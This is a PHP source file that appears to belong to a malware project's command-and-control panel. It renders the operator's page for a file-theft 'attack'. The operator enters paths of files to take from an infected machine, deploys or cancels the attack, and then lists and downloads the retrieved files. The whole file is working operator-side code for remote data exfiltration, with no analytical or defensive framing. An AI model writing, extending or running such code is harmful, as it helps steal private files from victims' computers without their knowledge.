<?php /** @noinspection PhpUnusedParameterInspection */

use Kelvinho\Virus\Attack\AdminTemplates;
use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Header;
use function Kelvinho\Virus\logAttackStatus;
use function Kelvinho\Virus\logError;
use function Kelvinho\Virus\map;

if (!isset($_SESSION["attack_id"])) {
    header("Location: " . DOMAIN);
    Header::redirect();
} else {
    $attack = AttackInterface::get($_SESSION["attack_id"]);
    ?>
    <html lang="en_US">
    <?php echo AdminTemplates::header(); ?>
    <body>
    <?php echo AdminTemplates::body($attack); ?>
    <label for="fileNames">Files</label><textarea id="fileNames" rows="12" cols="80" class="w3-input"
                                             style="resize: vertical;"
        <?php if ($attack->getStatus() != AttackInterface::STATUS_DORMANT) {
            echo "disabled";
        } ?>
    ><?php echo join("\n", $attack->getFileNames()); ?></textarea>
    <?php
    switch ($attack->getStatus()) {
        case AttackInterface::STATUS_DORMANT: ?>
            <p>Place the files you want to get above. Please note that if the files collectively are more than 8MB in
                size, the application physically can't support that, and an attack will be in "deployed" mode
                forever.</p>
            <?php break;
        case AttackInterface::STATUS_DEPLOYED: ?>
            <p>If you wish to edit the list of files, change it to dormant mode below.</p>
            <?php break;
        case AttackInterface::STATUS_EXECUTED: ?>
            <br>
            <?php break;
        default:
            logError("Attack status of " . $attack->getStatus() . " does not exist");
    }
    ?>
    <div class="w3-button w3-red" onclick="update()">Update</div>
    <?php
    switch ($attack->getStatus()) {
        case AttackInterface::STATUS_DORMANT: ?>
            <p>This attack is dormant. Click <a onclick="deployAttack()" class="link">here</a> to deploy.</p>
            <?php break;
        case AttackInterface::STATUS_DEPLOYED: ?>
            <p>This attack is deployed. Click <a onclick="cancelAttack()" class="link">here</a> to cancel the attack.
            </p>
            <?php break;
        case AttackInterface::STATUS_EXECUTED: ?>
            <p>This attack is executed. Available files:</p>
            <ul style="overflow: auto;">
                <?php
                $files = $attack->getNonEmptyFiles();
                if (count($files) === 0) {
                    ?>(No files)<?php
                } else {
                    map($files, function ($fileName, $index) { ?>
                        <li>
                            <pre style="cursor: pointer;"
                                 onclick="openFile('<?php echo "file$index"; ?>', '<?php echo end(explode("\\", $fileName)); ?>')"><?php echo htmlspecialchars($fileName); ?></pre>
                        </li>
                    <?php });
                } ?>
            </ul>
            <p>These files are either nonexistent, truly empty, or is too big to transfer:</p>
            <ul style="overflow: auto;">
                <?php
                $files = $attack->getEmptyFiles();
                if (count($files) === 0) {
                    ?>(No files)<?php
                } else {
                    map($files, function ($fileName, $index) { ?>
                        <li>
                            <pre><?php echo htmlspecialchars($fileName); ?></pre>
                        </li>
                    <?php });
                } ?>
            </ul>
            <?php break;
        default:
            logAttackStatus($attack->getStatus());
    }
    ?>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
    <script type="text/javascript" src="https://157239n.com/page/assets/js/main.js"></script>
    <script type="application/javascript">
        function update() {
            $.ajax({
                url: "<?php echo DOMAIN_CONTROLLER . "/updateAttack.php"; ?>",
                type: "POST",
                data: {
                    virus_id: "<?php echo $attack->getVirusId(); ?>",
                    attack_id: "<?php echo $attack->getAttackId(); ?>",
                    name: $("#name").val(),
                    profile: $("#profile").val()
                    <?php if ($attack->getStatus() == AttackInterface::STATUS_DORMANT) { ?>
                    , fileNames: $("#fileNames").val()
                    <?php } ?>
                },
                success: function (response) {
                    console.log(response);
                    window.location = "<?php echo DOMAIN_ATTACK_INFO; ?>"
                }
            });
        }

        function openFile(fileName, desiredName) {
            window.location = "<?php echo DOMAIN_CONTROLLER . "/getFile.php"; ?>?file=" + fileName + "&desiredName=" + desiredName;
        }
    </script>
    <?php echo AdminTemplates::script($attack); ?>
    </html>
<?php } ?>